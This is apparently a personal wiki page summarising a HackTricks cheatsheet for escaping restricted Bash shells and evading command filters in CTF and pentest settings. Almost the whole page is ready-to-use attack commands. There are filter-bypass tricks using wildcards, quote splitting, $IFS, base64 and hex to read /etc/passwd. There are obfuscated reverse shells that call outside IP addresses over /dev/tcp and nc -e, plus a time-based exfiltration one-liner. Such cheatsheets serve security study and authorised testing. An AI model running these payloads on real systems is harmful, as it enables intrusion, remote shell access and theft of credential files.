---
title: "HackTricks: Bypass Linux/Bash Restrictions"
tags: [linux-hardening, privilege-escalation, shell-escape, ctf]
sources: [hacktricks-bypass-bash-restrictions.md]
updated: 2026-05-01
---

# HackTricks: Bypass Linux/Bash Restrictions

Source: [hacktricks-bypass-bash-restrictions.md](../../raw/hacktricks-bypass-bash-restrictions.md)

## Key Takeaways

A cheatsheet of techniques for operating under restricted shells, WAF/filter bypass, and limited execution environments. Primarily CTF/pentest tradecraft. Organized by what is being bypassed.

## Bypass Forbidden Command Characters

```bash
# Wildcard substitution
/usr/bin/p?ng              # ping
/usr/bin/who*mi            # whoami

# Character classes
/usr/bin/n[c]              # nc

# Quote splitting
'p'i'n'g                   # ping
"w"h"o"a"m"i               # whoami

# Backslash
\u\n\a\m\e \-\a            # uname -a

# Variable expansion
who$@ami                   # whoami

# Case transformation
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
$(rev<<<'imaohw')

# Base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

## Bypass Forbidden Spaces

```bash
cat${IFS}/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
echo "ls\x09-l" | bash       # tab as separator
```

## Bypass Backslash/Slash

```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
```

## Bypass Hex Encoding

```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `xxd -r -p <<< 2f6574632f706173737764`
```

## Bypass Pipes

```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

## Builtin-Only Environments

When only shell builtins are available:

```bash
# Read file without cat
while read -r line; do echo $line; done < /etc/passwd

# Get "/" from $PWD
printf %.1s "$PWD"

# Execute using read + eval
read aaa; eval $aaa

# Source unknown file (CTF flag in current dir)
source f*
```

## Reverse Shell Obfuscation

Double base64 avoids `+` characters:

```bash
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
```

Short reverse shell (no echo):

```bash
(sh)0>/dev/tcp/10.10.10.10/443
exec >&0
```

## Bash NOP Sled ("Bashsledding")

When controlling an argument reaching `system()` but not knowing the exact offset, Bash ignores leading whitespace before executing a command — acts as a shell-level NOP sled:

```
"                nc -e /bin/sh 10.0.0.1 4444"
```

ROP chain landing anywhere in the space block still executes `nc`. Works with BusyBox `ash`/`sh` too.

## Time-Based Exfiltration

```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```

## Related

- [linux-privilege-escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks: Bypass FS Protections](hacktricks-bypass-fs-protections.md)
- [HackTricks](../entities/hacktricks.md)
